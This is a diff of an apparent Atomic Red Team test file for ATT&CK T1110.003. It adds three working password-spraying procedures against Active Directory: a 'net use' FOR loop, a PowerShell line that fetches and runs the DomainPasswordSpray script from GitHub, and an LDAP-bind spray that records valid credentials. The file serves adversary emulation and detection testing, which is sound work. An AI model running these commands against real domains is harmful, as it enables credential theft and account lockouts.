@@ -1,47 +1,116 @@
 attack_technique: T1110.003
 display_name: 'Brute Force: Password Spraying'
 atomic_tests:
-- name: Password spray
-  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
+- name: Password Spray all Domain Users
+  auto_generated_guid: 90bc2e54-6c84-47a5-9439-0a2a92b4b175
+  description:
+    CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
+
+    This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list.
+    Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period.
+    Use the input arguments to specify your own password to use for the password spray.
+
+    Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
+
+    See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
+  supported_platforms:
+  - windows
+  input_arguments:
+    password:
+      description: The password to try for each user in users.txt
+      type: string
+      default: Spring2020
+  dependencies:
+  - description: |
+      List of domain users to password spray must exits at %temp%\users.txt
+    prereq_command: |
+      if not exist %temp%\users.txt (exit /b 1)
+    get_prereq_command: |
+      PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
+
+- name: Password Spray (DomainPasswordSpray)
+  auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
   description: |
-    Attempt to brute force all domain users on remote host
+    Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
+
+    https://github.com/dafthack/DomainPasswordSpray
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    domain:
+      description: Domain to brute force against
+      type: String
+      default: (Get-ADDomain | Select-Object -ExpandProperty Name)
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
+- name: Password spray all domain users with a couple of passwords via LDAP against domain controller (NTLM or Kerberos)
+  auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
+  description: |
+    Attempt to brute force all domain user with a couple of passwords (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
   supported_platforms:
   - windows
   input_arguments:
     passwords:
-      description: list of passwords we will attempt to brute force with
+      description: list of passwords we will attempt to brute force with (not too many, else it's more a bruteforce than a password spraying)
       type: String
       default: Pa`$`$w0rd`n123456`npassword
+    dc:
+      description: Name of the domain controller we will target (without domain FQDN suffix)
+      type: String
+      default: dc
     domain:
-      description: Domain name of the target system we will brute force upon
+      description: Domain FQDN
       type: String
       default: contoso.com
     output_file:
-      description: Path to bruteforce output 
+      description: Path to password spraying output
       type: Path
       default: C:\Windows\Temp\tmp.txt
-    number_of_attempts:
-      description: Number of password spraying attempts 
-      type: String
-      default: 2
+    auth:
+      description: authentication method to choose between "NTLM" and "Kerberos"
+      type: string
+      default: NTLM
   executor:
     name: powershell
+    elevation_required: false
     command: |
-      $DomainUsers = Get-ADUser -Filter * | Select-Object -Property SamAccountName
+      if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
+        Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+        exit 1
+      }
+
+      $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' | Select-Object -ExpandProperty SamAccountName
+
+      [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+      $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{dc}.#{domain}",389)
+
       $passwords = "#{passwords}".split("{`n}")
-      $found = @()
-      for ($i = 0; $i -lt #{number_of_attempts}; $i++) {
-        "[-] Round ${i} of password password spraying" | Out-File -FilePath #{output_file} -Append
-        $DomainUsers | Foreach-Object {
-          foreach ($password in $passwords){
-            " [-] Attempting ${password} on account $($_.SamAccountName)." | Out-File -FilePath #{output_file} -Append
-            if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
-              if (-not ($found.Contains("$($_.SamAccountName):${password}"))){
-                " [!] $($_.SamAccountName):${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
-                $found += ,"$($_.SamAccountName):${password}"
-              }
-            }
+      $DomainUsers | Foreach-Object {
+        $user = $_
+        foreach ($password in $passwords){
+          $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
+          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
+          try {
+            " [-] Attempting ${password} on account ${user}." | Out-File -FilePath #{output_file} -Append
+            $conn.bind()
+            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+            " [!] ${user}:${password} are valid credentials!" | Out-File -FilePath #{output_file} -Append
+          } catch {
+            $_.Exception.Message | Out-File -FilePath #{output_file} -Append
           }
         }
       }
-      "End of bruteforce" | Out-File -FilePath #{output_file} -Append
+      "End of password spraying" | Out-File -FilePath #{output_file} -Append
+    cleanup_command: |
+      del #{output_file}
